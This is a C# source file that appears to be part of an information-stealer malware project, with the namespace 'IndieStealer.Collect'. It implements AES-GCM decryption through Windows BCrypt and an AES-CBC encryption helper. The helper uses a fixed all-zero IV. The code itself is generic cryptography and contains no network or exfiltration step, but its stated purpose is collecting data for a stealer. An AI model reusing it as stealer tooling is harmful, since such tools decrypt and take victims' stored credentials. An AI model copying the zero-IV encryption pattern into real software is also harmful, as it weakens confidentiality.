using System;
using System.Security.Cryptography;

using static IndieStealer.Collect.AesGcm.AES.BCrypt;

namespace IndieStealer.Collect.AesGcm.AES
{
    public static unsafe class AESGCM
    {
       
        public static byte[] GcmDecrypt(byte[] pbData, byte[] pbKey, byte[] pbNonce, byte[] pbTag, byte[] pbAuthData = null)
        {

            pbAuthData = pbAuthData ?? new byte[0];

            NTSTATUS status;

            using (var provider = BCryptOpenAlgorithmProvider(AlgorithmIdentifiers.BCRYPT_AES_ALGORITHM))
            {
                BCryptSetProperty(provider, PropertyNames.BCRYPT_CHAINING_MODE, ChainingModes.Gcm);

                var tagLengths = BCryptGetProperty<BCRYPT_AUTH_TAG_LENGTHS_STRUCT>(provider, PropertyNames.BCRYPT_AUTH_TAG_LENGTH);

                if (pbTag.Length < tagLengths.dwMinLength
                || pbTag.Length > tagLengths.dwMaxLength
                || (pbTag.Length - tagLengths.dwMinLength) % tagLengths.dwIncrement != 0)
                    throw new ArgumentException();

                using (var key = BCryptGenerateSymmetricKey(provider, pbKey))
                {
                    var authInfo = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO.Create();
                    fixed (byte* pTagBuffer = pbTag)
                    fixed (byte* pNonce = pbNonce)
                    fixed (byte* pAuthData = pbAuthData)
                    {
                        authInfo.pbNonce = pNonce;
                        authInfo.cbNonce = pbNonce.Length;
                        authInfo.pbTag = pTagBuffer;
                        authInfo.cbTag = pbTag.Length;
                        authInfo.pbAuthData = pAuthData;
                        authInfo.cbAuthData = pbAuthData.Length;

                                                int pcbPlaintext = pbData.Length;

                                                byte[] pbPlaintext = new byte[pcbPlaintext];

                        fixed (byte* ciphertext = pbData)
                        fixed (byte* plaintext = pbPlaintext)
                        {
                                                        status = BCryptDecrypt(
                               key,
                               ciphertext,
                               pbData.Length,
                               &authInfo,
                               null,
                               0,
                               plaintext,
                               pbPlaintext.Length,
                               out pcbPlaintext,
                               0);
                        }
                        if (status.Value == NTSTATUS.Code.STATUS_AUTH_TAG_MISMATCH)
                            throw new CryptographicException(/*"BCryptDecrypt auth tag mismatch"*/);
                        if (status.Value != NTSTATUS.Code.STATUS_SUCCESS)
                            throw new CryptographicException(/*$"BCryptDecrypt failed result {status:X} "*/);

                        return pbPlaintext;

                    }
                }
            }

        }
        
        public static byte[] Encrypt(byte[] bytes, byte[] Key) 
        {  
            var cryptProvider = new AesCryptoServiceProvider();
            cryptProvider.BlockSize = 128;
            cryptProvider.KeySize = 256;
            cryptProvider.IV = new byte[16];
            using (SHA256 sha256 = SHA256.Create())
                cryptProvider.Key = sha256.ComputeHash(Key);
            cryptProvider.Mode = CipherMode.CBC;
            cryptProvider.Padding = PaddingMode.PKCS7;
            ICryptoTransform transform = cryptProvider.CreateEncryptor();
            byte[] encryptedBytes = transform.TransformFinalBlock(bytes, 0, bytes.Length);
            return encryptedBytes;
        }
    }
}
